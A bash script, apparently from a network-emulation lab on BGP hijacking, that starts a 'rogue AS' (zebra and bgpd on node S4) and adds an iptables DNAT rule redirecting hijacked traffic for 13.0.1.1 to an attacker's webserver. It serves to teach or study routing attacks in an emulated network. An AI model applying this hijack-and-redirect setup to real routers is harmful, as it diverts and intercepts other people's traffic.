#!/bin/bash

echo "Killing any existing rogue AS"
./stop_rogue.sh

echo "Starting rogue AS"
# Run both daemons in parallel to reduce startup time
sudo python3 run.py --node S4 --cmd "sudo /usr/sbin/zebra -f conf/zebra-S4.conf -d -i /tmp/zebra-S4.pid > logs/S4-zebra-stdout 2>&1" &
PID1=$!
sudo python3 run.py --node S4 --cmd "sudo /usr/sbin/bgpd -f conf/bgpd-S4.conf -d -i /tmp/bgpd-S4.pid > logs/S4-bgpd-stdout 2>&1" &
PID2=$!
wait $PID1 $PID2

# Configure S4 interface to communicate with the attacker host (h4-1)
# This is necessary because h4-1 is on 14.0.1.0/24, but zebra config might not set this up.
sudo python3 run.py --node S4 --cmd "sudo ifconfig S4-eth1 14.0.1.254 netmask 255.255.255.0 up"

# Add a NAT rule on the rogue router to forward hijacked traffic to the attacker's webserver.
# Hijacked traffic for 13.0.1.1 will be redirected to h4-1 (which now has IP 14.0.1.1).
echo "Adding NAT rule on S4 to redirect traffic"
sudo python3 run.py --node S4 --cmd "sudo iptables -t nat -A PREROUTING -d 13.0.1.1 -j DNAT --to-destination 14.0.1.1"

# Verify startup
sleep 1
if pgrep -f "bgpd-S4" > /dev/null; then
    echo "Rogue AS started successfully."
else
    echo "Error: Rogue AS failed to start. Check logs/S4-bgpd-stdout."
fi
